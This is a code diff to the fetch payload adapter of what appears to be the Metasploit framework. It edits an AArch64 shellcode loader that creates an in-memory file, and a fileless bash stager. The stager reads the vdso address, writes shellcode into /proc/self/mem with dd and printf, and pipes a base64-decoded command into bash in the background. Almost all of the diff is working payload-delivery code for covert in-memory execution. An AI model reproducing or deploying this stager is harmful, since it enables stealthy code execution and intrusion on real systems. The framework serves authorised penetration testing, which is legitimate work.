@@ -331,20 +331,20 @@ module Msf::Payload::Adapter::Fetch
       # pid = getpid()
       # kill(pid,SIGSTOP)
       in_memory_loader_asm = [
-        0x802888d2, #0x1000:	mov	x0, #0x4144	0x802888d2
-          0xa088a8f2, #0x1004:	movk	x0, #0x4445, lsl #16	0xa088a8f2
-          0xe00f1ff8, #0x1008:	str	x0, [sp, #-0x10]!	0xe00f1ff8
-          0xe0030091, #0x100c:	mov	x0, sp	0xe0030091
-          0x210001ca, #0x1010:	eor	x1, x1, x1	0x210001ca
-          0xe82280d2, #0x1014:	mov	x8, #0x117	0xe82280d2
-          0x010000d4, #0x1018:	svc	#0	0x010000d4
-          0xc80580d2, #0x101c:	mov	x8, #0x2e	0xc80580d2
-          0x010000d4, #0x1020:	svc	#0	0x010000d4
-          0x881580d2, #0x1024:	mov	x8, #0xac	0x881580d2
-          0x010000d4, #0x1028:	svc	#0	0x010000d4
-          0x610280d2, #0x102c:	mov	x1, #0x13	0x610280d2
-          0x281080d2, #0x1030:	mov	x8, #0x81	0x281080d2
-          0x010000d4, #0x1034:	svc	#0	0x010000d4
+          0x000080d2, #0x1000:	mov	x0, #0	0x000080d2
+          0xe00f1ff8, #0x1004:	str	x0, [sp, #-0x10]!	0xe00f1ff8
+          0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
+          0x210001ca, #0x100c:	eor	x1, x1, x1	0x210001ca
+          0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
+          0x010000d4, #0x1014:	svc	#0	0x010000d4
+          0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
+          0x010000d4, #0x101c:	svc	#0	0x010000d4
+          0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
+          0x010000d4, #0x1024:	svc	#0	0x010000d4
+          0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
+          0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
+          0x010000d4, #0x1030:	svc	#0	0x010000d4
+
       ]
       payload = in_memory_loader_asm.pack("N*")
     when 'armle'
@@ -475,7 +475,8 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
-    Base64.encode64(payload)
+    payload.unpack("H*")[0]
+    #Base64.strict_encode64(payload).gsub(/\n/, '')
   end
 
   def _generate_jmp_instruction
@@ -515,8 +516,9 @@ module Msf::Payload::Adapter::Fetch
   def _generate_fileless_bash(get_file_cmd)
     stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
     stage_cmd << %(jmp=#{_generate_jmp_instruction};)
-    stage_cmd << "sc=$(echo '#{_generate_first_stage_shellcode}' | base64 -d);"
+    stage_cmd << "sc='#{_generate_first_stage_shellcode}';"
     stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
+    stage_cmd << %<sc=$(printf $sc | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
     stage_cmd << 'read syscall_info < /proc/self/syscall;'
     stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
     stage_cmd << 'exec 3>/proc/self/mem;'
@@ -527,7 +529,7 @@ module Msf::Payload::Adapter::Fetch
     stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
     stage_cmd << 'printf $jmp >&3;'
 
-    cmd = "echo '#{Base64.strict_encode64(stage_cmd)}' | base64 -d | bash & "
+    cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | bash & "
     cmd << 'cd /proc/$!;'
     cmd << 'sleep 1;' #adding short pause to give process time to load file handle
     cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
